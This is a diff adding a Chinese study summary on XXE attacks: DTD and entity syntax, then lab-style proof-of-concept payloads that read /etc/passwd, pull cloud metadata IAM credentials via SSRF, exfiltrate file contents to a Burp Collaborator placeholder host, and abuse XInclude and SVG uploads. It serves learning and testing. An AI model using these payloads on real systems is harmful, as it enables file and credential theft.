@@ -928,3 +928,188 @@ Content-Type: application/xml
 | **网络层**     | 防火墙限制元数据服务访问、监控异常外联请求               |
 | **日志与监控** | 记录XML解析错误、审计异常文件上传行为                    |
 
+# 三、总结
+
+## xml-DTD语法：
+
+##### 什么是dtd、实体:
+
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+
+1. []里面的所有内容都叫dtd
+2. 里面的每个entity叫实体
+
+##### 普通参数、实体参数的区别：
+
+1. 普通参数可以用于显示/读取内容，实体参数不能
+
+2. 普通参数能在xml内部引用、dtd内部声明嵌套使用、实体参数只能在dtd内部引用
+
+3. 普通参数、实体参数都能用与内部实体与外部实体
+
+4. 嵌套：
+
+   | 实体类型 A ➝ 实体类型 B | A 能嵌套 B? | 说明                                   |
+   | ----------------------- | ----------- | -------------------------------------- |
+   | 参数实体 ➝ 参数实体     | ✅           | 可在**外部子集**内嵌套，构建复杂 DTD。 |
+   | 参数实体 ➝ 普通实体     | ✅           | 可定义普通实体。                       |
+   | 普通实体 ➝ 参数实体     | ❌           | 参数实体不能出现在普通实体值里。       |
+   | 普通实体 ➝ 普通实体     | ✅           | 可递归定义，如 “Billion Laughs”。      |
+
+##### 内部实体、外部实体：
+
+1. 内部实体没有SYSTEM，外部实体有
+2. 内部实体只能进行字符串替换，外部实体可以加载http请求，加载外部dtd
+
+##### 外部dtd与内部dtd的区别：
+
+1. 外部dtd能够嵌套+解析参数实体，内部dtd不能内部嵌套+解析（但是可以**内部嵌套，外部解析**）
+
+   ```
+   <!DOCTYPE message [
+   <!ENTITY % file SYSTEM "file:///etc/passwd">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+   %eval;
+   %exfil;
+   ]>
+   1. 如果在内部dtd中直接报错
+   ```
+
+   ```
+   <!DOCTYPE message [
+   <!ENTITY % shell '
+   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///invalid/&#x25;file;&#x27;>">
+   &#x25;eval;
+   &#x25;exfil;
+   '>
+   %shell;
+   ]>
+   1. 如果加%shell，在内部dtd中不报错，因为还没有展开解析%shell
+   2. 如果是在外部的dtd中加载%shell，也不会报错
+   ```
+
+   ```
+   <!DOCTYPE message [
+   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+   <!ENTITY % ISOamso '
+   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+   &#x25;eval;
+   &#x25;error;
+   '>
+   %local_dtd;
+   ]>
+   1. 内嵌外解，docbookx.dtd中引用了%ISOamso;
+   ```
+
+2. 外部dtd解析权限更高，条件更加宽松，这才是XXE选择外部dtd的主要原因！
+
+##### 引用外部dtd方式：
+
+1. 直接doc引用
+
+   ```
+   <!DOCTYPE note SYSTEM "note.dtd">
+   ```
+
+2. 外部实体引用
+
+   ```
+   <!DOCTYPE doc [
+     <!ENTITY % ext SYSTEM "external.dtd">
+     %ext;
+   ]>
+   ```
+
+## 场景POC：
+
+##### 1、普通参数外部实体，读取敏感文件
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+##### 2、普通参数外部实体，回显SSRF
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+##### 3、普通参数外部实体，无回显SSRF：
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://szvf6640kwamspb20mzo50apngt8hy5n.oastify.com/"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+##### 4、实体参数外部实体，无回显SSRF：
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://8nw9bwmptk84otxllaxw5wpia9g04rsg.oastify.com"> %xxe; ]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+##### 5、内部dtd：实体参数外部实体引用外部dtd、外部dtd：实体参数外部实体嵌套实体参数外部实体
+
+外部dtd:
+
+1. 无回显读取敏感文件
+
+   ```
+   <!ENTITY % file SYSTEM "file:///etc/hostname">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+   %eval;
+   %exfil;
+   ```
+
+2. 回显读取敏感文件
+
+   ```
+   <!ENTITY % file SYSTEM "file:///etc/passwd">
+   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+   %eval;
+   %exfil;
+   ```
+
+内部dtd:
+
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
+
+##### 6、XInclude，插入xml主体，回显敏感文件
+
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+## 注入点：
+
+##### 明确post是xml：
+
+1. 插入dtd
+2. 插入xml主体
+
+##### 没有明确是xml：
+
+1. 可以尝试插入xml主体
+
+##### 上传svg/xml文件点：
+
+例：
+
+```
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+
+
